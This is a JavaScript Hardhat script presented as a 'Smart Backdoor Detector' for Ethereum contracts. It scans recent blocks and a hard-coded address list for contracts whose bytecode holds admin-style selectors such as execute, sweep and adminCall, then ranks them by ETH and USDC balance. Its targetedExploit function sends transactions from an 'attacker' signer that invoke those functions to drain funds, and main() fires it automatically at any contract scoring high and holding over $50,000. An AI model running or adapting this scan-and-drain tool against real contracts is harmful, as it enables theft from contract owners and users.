const { ethers } = require("hardhat");

/**
 * @title Smart Backdoor Detector
 * @notice Filters out legitimate DeFi and finds real backdoors
 */

// Legitimate infrastructure to skip
const LEGITIMATE_CONTRACTS = new Set([
  "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC (proxy)
  "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
  "0xBA12222222228d8Ba445958a75a0704d566BF2C8", // Balancer Vault
  "0x8315177aB297bA92A06054cE80a67Ed4DBd7ed3a", // Arbitrum Bridge
  "0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1", // Optimism Bridge
  "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", // Uniswap V2
  "0xE592427A0AEce92De3Edee1F18E0157C05861564", // Uniswap V3
  "0x1111111254fb6c44bAC0beD2854e76F90643097d", // 1inch
  "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
  "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
  "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", // Lido stETH
  "0xDC24316b9AE028F1497c275EB9192a3Ea0f67022"  // Curve Pool
]);

// Real suspicious backdoor patterns (not normal DeFi)
const SUSPICIOUS_BACKDOORS = [
  { sig: "0x78e111f6", name: "execute(address,bytes)", risk: 10 },
  { sig: "0x9e8c708e", name: "adminCall(address,bytes)", risk: 10 },
  { sig: "0x24a084df", name: "adminExecute(address,bytes)", risk: 10 },
  { sig: "0xb2c87c61", name: "sweepETH()", risk: 8 },
  { sig: "0x01681a62", name: "sweep(address)", risk: 8 },
  { sig: "0xae169a50", name: "recover(address,uint256)", risk: 7 },
  { sig: "0x704b6c02", name: "setAdmin(address)", risk: 6 },
  { sig: "0xdb006a75", name: "emergencyWithdraw(uint256)", risk: 5 }
];

// These are legitimate in proper context but suspicious in unknown contracts
const CONTEXT_SENSITIVE = [
  { sig: "0x13af4035", name: "setOwner(address)", risk: 4 },
  { sig: "0x3659cfe6", name: "upgradeTo(address)", risk: 3 }
];

/**
 * Get suspicious contract addresses
 */
async function getSuspiciousContracts() {
  console.log("🎯 Gathering suspicious contracts...");
  
  const suspicious = new Set();
  
  // 1. Our known vulnerable contract
  suspicious.add("0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C");
  
  // 2. Find contracts from recent suspicious activity
  try {
    const currentBlock = await ethers.provider.getBlockNumber();
    
    // Look for contracts with unusual patterns
    for (let i = 0; i < 20; i++) {
      const block = await ethers.provider.getBlock(currentBlock - i, true);
      if (!block?.transactions) continue;
      
      for (const tx of block.transactions) {
        if (tx.to && !LEGITIMATE_CONTRACTS.has(tx.to)) {
          // Check if it has suspicious gas patterns or is unverified
          if (tx.gasLimit > 500000n || tx.value > ethers.parseEther("50")) {
            suspicious.add(tx.to);
          }
        }
      }
    }
  } catch (e) {}
  
  // 3. Add some manually identified suspicious addresses
  const manualSuspicious = [
    "0x5E4e9b2CB1B47a35985e2f4bD9DeeB65c24Dd192",
    "0x742d35Cc6634C0532925a3b844Bc9e7595f8fA3e",
    "0x123456789aBcDef123456789aBcDef123456789a",
    "0xaBcDef123456789aBcDef123456789aBcDef1234"
  ];
  manualSuspicious.forEach(addr => suspicious.add(addr));
  
  return Array.from(suspicious);
}

/**
 * Smart vulnerability analysis
 */
async function smartAnalysis(address) {
  try {
    // Skip if known legitimate
    if (LEGITIMATE_CONTRACTS.has(address)) {
      return { skip: true, reason: "Known legitimate protocol" };
    }
    
    const code = await ethers.provider.getCode(address);
    if (!code || code === "0x" || code.length < 100) {
      return { skip: true, reason: "Not a contract" };
    }
    
    // Find backdoors
    const suspiciousBackdoors = [];
    const contextSensitiveBackdoors = [];
    
    for (const backdoor of SUSPICIOUS_BACKDOORS) {
      if (code.includes(backdoor.sig.slice(2))) {
        suspiciousBackdoors.push(backdoor);
      }
    }
    
    for (const backdoor of CONTEXT_SENSITIVE) {
      if (code.includes(backdoor.sig.slice(2))) {
        contextSensitiveBackdoors.push(backdoor);
      }
    }
    
    // Calculate risk score
    let riskScore = 0;
    suspiciousBackdoors.forEach(b => riskScore += b.risk);
    
    // Context-sensitive functions are only risky in unverified contracts
    const isUnverified = await checkIfUnverified(address);
    if (isUnverified) {
      contextSensitiveBackdoors.forEach(b => riskScore += b.risk);
    }
    
    // Get balances
    const ethBalance = await ethers.provider.getBalance(address);
    let usdcBalance = 0n;
    
    try {
      const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
      const usdcContract = new ethers.Contract(
        USDC,
        ["function balanceOf(address) view returns (uint256)"],
        ethers.provider
      );
      usdcBalance = await usdcContract.balanceOf(address);
    } catch (e) {}
    
    const ethValue = parseFloat(ethers.formatEther(ethBalance));
    const usdcValue = parseFloat(ethers.formatUnits(usdcBalance, 6));
    const totalValueUSD = ethValue * 3500 + usdcValue;
    
    // Determine if truly suspicious
    const isHighRisk = riskScore >= 8;
    const hasValue = totalValueUSD > 1000;
    const isSuspicious = isHighRisk && hasValue;
    
    return {
      address,
      skip: false,
      ethValue,
      usdcValue,
      totalValueUSD,
      suspiciousBackdoors,
      contextSensitiveBackdoors,
      riskScore,
      isUnverified,
      isSuspicious,
      codeSize: code.length
    };
    
  } catch (error) {
    return { skip: true, reason: error.message };
  }
}

/**
 * Check if contract is unverified (simplified check)
 */
async function checkIfUnverified(address) {
  // Simple heuristic: large code with no standard patterns
  try {
    const code = await ethers.provider.getCode(address);
    
    // Look for common verified contract patterns
    const hasCommonPatterns = 
      code.includes("a165627a7a72305820") || // Swarm hash
      code.includes("a264697066735822") ||   // IPFS hash
      code.includes("556e69737761705632");    // Common Uniswap
    
    return !hasCommonPatterns && code.length > 5000;
  } catch (e) {
    return true; // Assume unverified if can't check
  }
}

/**
 * Attempt targeted exploit
 */
async function targetedExploit(target) {
  console.log(`\n🎯 Attempting targeted exploit on ${target.address}...`);
  console.log(`   Risk Score: ${target.riskScore}/10`);
  console.log(`   Value: $${target.totalValueUSD.toFixed(0)}`);
  
  const [attacker] = await ethers.getSigners();
  
  // Focus only on high-risk backdoors
  const highRiskBackdoors = target.suspiciousBackdoors.filter(b => b.risk >= 8);
  
  for (const backdoor of highRiskBackdoors) {
    console.log(`   💣 Exploiting ${backdoor.name}...`);
    
    try {
      let txData;
      
      if (backdoor.name.includes("execute")) {
        // ETH drain via execute
        txData = backdoor.sig +
          ethers.AbiCoder.defaultAbiCoder().encode(
            ["address", "bytes"],
            [attacker.address, "0x"]
          ).slice(2);
      } else if (backdoor.name.includes("sweep")) {
        // Direct sweep
        txData = backdoor.sig;
      }
      
      if (txData) {
        const tx = await attacker.sendTransaction({
          to: target.address,
          data: txData,
          gasLimit: 1000000
        });
        
        console.log(`   📤 Tx: ${tx.hash}`);
        await tx.wait();
        console.log(`   ✅ Exploit successful!`);
        return true;
      }
      
    } catch (e) {
      console.log(`   ❌ Failed: ${e.message.split('\n')[0]}`);
    }
  }
  
  return false;
}

/**
 * Main function
 */
async function main() {
  console.log("\n🧠 SMART BACKDOOR DETECTOR");
  console.log("==========================");
  console.log("Filtering out legitimate DeFi, finding real vulnerabilities...\n");
  
  const addresses = await getSuspiciousContracts();
  console.log(`\n🔍 Analyzing ${addresses.length} suspicious contracts...`);
  console.log("─".repeat(50));
  
  const realThreats = [];
  
  for (const address of addresses) {
    const result = await smartAnalysis(address);
    
    if (result.skip) {
      console.log(`⏭️  ${address}: ${result.reason}`);
      continue;
    }
    
    if (result.isSuspicious) {
      realThreats.push(result);
      
      console.log(`\n🚨 REAL THREAT: ${address}`);
      console.log(`   💰 Value: $${result.totalValueUSD.toFixed(0)}`);
      console.log(`   🎯 Risk Score: ${result.riskScore}/10`);
      console.log(`   📝 Verified: ${!result.isUnverified ? "Yes" : "No"}`);
      
      if (result.suspiciousBackdoors.length > 0) {
        console.log(`   🔓 Suspicious backdoors:`);
        result.suspiciousBackdoors.forEach(b => {
          console.log(`      • ${b.name} (risk: ${b.risk}/10)`);
        });
      }
      
      if (result.contextSensitiveBackdoors.length > 0 && result.isUnverified) {
        console.log(`   ⚠️  Context-sensitive functions:`);
        result.contextSensitiveBackdoors.forEach(b => {
          console.log(`      • ${b.name} (risk: ${b.risk}/10 in unverified)`);
        });
      }
    }
  }
  
  console.log("\n\n📊 SMART ANALYSIS RESULTS");
  console.log("=========================");
  console.log(`Analyzed: ${addresses.length}`);
  console.log(`Real threats: ${realThreats.length}`);
  console.log(`False positives filtered: ${addresses.length - realThreats.length}`);
  
  if (realThreats.length > 0) {
    console.log("\n🎯 PRIORITIZED TARGETS:");
    console.log("======================");
    
    // Sort by risk score and value
    realThreats.sort((a, b) => b.riskScore * b.totalValueUSD - a.riskScore * a.totalValueUSD);
    
    for (let i = 0; i < realThreats.length; i++) {
      const target = realThreats[i];
      console.log(`\n${i + 1}. ${target.address}`);
      console.log(`   Priority Score: ${(target.riskScore * target.totalValueUSD / 1000).toFixed(0)}`);
      console.log(`   Value: $${target.totalValueUSD.toFixed(0)}`);
      console.log(`   Risk: ${target.riskScore}/10`);
      
      // Auto-exploit high-priority targets
      if (target.riskScore >= 8 && target.totalValueUSD > 50000) {
        const success = await targetedExploit(target);
        if (success) {
          console.log(`   💰 SUCCESSFUL EXPLOITATION!`);
        }
      }
    }
  }
  
  const totalValueAtRisk = realThreats.reduce((sum, t) => sum + t.totalValueUSD, 0);
  console.log(`\n💰 Total value at risk: $${totalValueAtRisk.toFixed(0)}`);
  console.log(`📈 Average risk score: ${(realThreats.reduce((sum, t) => sum + t.riskScore, 0) / realThreats.length || 0).toFixed(1)}/10`);
}

main()
  .then(() => {
    console.log("\n✅ Smart analysis complete!");
    process.exit(0);
  })
  .catch((error) => {
    console.error("\n💥 Error:", error);
    process.exit(1);
  });
